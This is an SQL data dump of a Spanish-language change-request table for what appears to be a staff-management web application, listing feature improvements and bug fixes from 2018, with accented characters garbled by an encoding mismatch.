INSERT INTO `cambios_mejoras` VALUES (1,9,'Mejora','Reconocimientos mГ©dicos solo debe mostrar en la lista index el ultimo reconocimiento',1,'2018-01-12 00:00:00','2018-01-14 18:53:45'),(2,9,'Mejora','Exportar a excel los asistentes a un curso',1,'2018-01-12 18:30:24','2018-01-15 12:23:45'),(3,9,'Mejora','Exportar a Excel resumen de agentes',1,'2018-01-14 17:20:42','2018-01-14 17:20:42'),(5,9,'Cambio Funcionamiento','Quitar Ermua de Resdencias e Inspector de categorГӯas',1,'2018-01-15 11:55:21','2018-01-15 16:15:12'),(6,9,'Mejora','Crear un campo de estado de agente: Liberado, desplazado, baja etc',1,'2018-01-15 11:56:19','2018-01-16 07:54:57'),(7,9,'Mejora','Ocultar campos de Creado y modificado',1,'2018-01-15 11:57:47','2018-01-15 16:16:56'),(8,9,'Mejora','Filtrar en el modulo de residencias por el puesto de gestiГіn',1,'2018-01-15 11:58:43','2018-01-16 08:04:25'),(9,9,'Mejora','Nuevo modulo de lugar de reconocimiento medico',1,'2018-01-15 11:59:13','2018-01-16 08:04:37'),(10,9,'Mejora','Ordenar los reconocimientos mГ©dicos de gorma inversa, de mas antiguo a mas nuevo',1,'2018-01-15 11:59:48','2018-01-16 08:04:49'),(11,9,'Mejora','Boton de retroceso: volver a la ultima ventana en lugar de index.\r\nTambiГ©n se puede aГұadir un botГіn para ir al index',1,'2018-01-15 12:00:53','2018-01-16 08:46:57'),(12,9,'Mal funcionamiento','En ventanas de editar y aГұadir donde hay que elegir el agente cambiar texto por Agente',1,'2018-01-15 12:01:49','2018-01-16 08:35:22'),(13,9,'Mejora','DГӯas pedidos trabajador: \r\ncampo para indicar si debe o no debe el dГӯa.\r\nOrdenar por fecha correctamente descendente\r\nCheck de respuesta (si, no, pendiente)',1,'2018-01-15 12:21:30','2018-02-02 21:09:32'),(14,9,'Cambio Funcionamiento','CГіmputos:\r\nPosibilidad de elegir varios dГӯas consecutivos.\r\nAgregarlo a dГӯas pedidos trabajador sin contabilizar como deuda.',1,'2018-01-15 12:23:08','2018-02-07 18:27:06'),(15,9,'Mal funcionamiento','Pantalla resumen no ordena por fecha reconocimiento',1,'2018-01-16 06:09:38','2018-01-18 18:22:43'),(16,9,'Mejora','Copiar un dГӯa de computo y cambiar fecha',0,'2018-01-17 06:39:25','2018-01-17 06:39:25'),(17,9,'Mejora','Al crear un nuevo agente que el combo de estado aparezca DISPONIBLE por defecto',1,'2018-01-18 09:38:30','2018-01-18 18:06:47'),(18,9,'Mejora','En la pantalla de aГұadir asisten a formaciГіn el botГіn atrГЎs tiene que volver al Гӯndice de acciones formativas',1,'2018-01-18 09:40:23','2018-01-18 18:03:43'),(19,9,'Mejora','Al exportar los asistentes de un curso exportar primero por fecha y luego por apellido',1,'2018-01-18 09:40:59','2018-01-18 18:03:28'),(20,9,'Mejora','EXPORTACION AGENTES COMPROBAR EXPORTACION INCLUIR DNI',1,'2018-01-19 10:55:37','2018-01-19 20:05:03'),(21,9,'Mejora','Computos: poner filtro de aГұo con desplegable, cambiar el aГұo y poner uno menos ',1,'2018-01-22 08:02:07','2018-01-24 06:52:18'),(22,9,'Mejora','En cursos filtro para agentes y categorГӯas.\r\nPor agentes segГәn tengas elegida la zona en preferencias\r\nPor categorГӯas asignar al curso un nuevo campo de categorias a las que esta destinado',1,'2018-01-29 12:13:20','2018-02-02 21:07:35'),(23,9,'Mejora','En aГұadir de formacion poner la misma fecha en inicio y fin al cambiar',1,'2018-01-29 12:25:57','2018-02-02 21:07:40'),(32,9,'Mejora','AГұadir filtro de aГұo para dГӯa adicional de vacaciones',1,'2018-02-05 13:00:11','2018-02-07 18:15:33'),(33,9,'Mejora','Al validar un dГӯa solicitado por el trabajador preguntar si se quiere pasar al computo y pasarlo al computo si procede',1,'2018-02-06 07:21:42','2018-02-16 11:45:09'),(34,9,'Mal funcionamiento','Computos ordenar por correctamente por horas y no por texto',1,'2018-02-07 11:32:22','2018-02-07 18:15:28'),(35,9,'Mejora','Envio de correo al aceptar un dГӯa solicitado',0,'2018-02-20 09:21:45','2018-02-20 09:21:45'),(36,9,'Mejora','preubas 2',0,'2018-10-04 09:12:08','2018-10-04 09:12:08'),(37,20,'Mejora','hola',0,'2018-10-04 09:15:07','2018-10-04 09:15:07'),(38,20,'Mej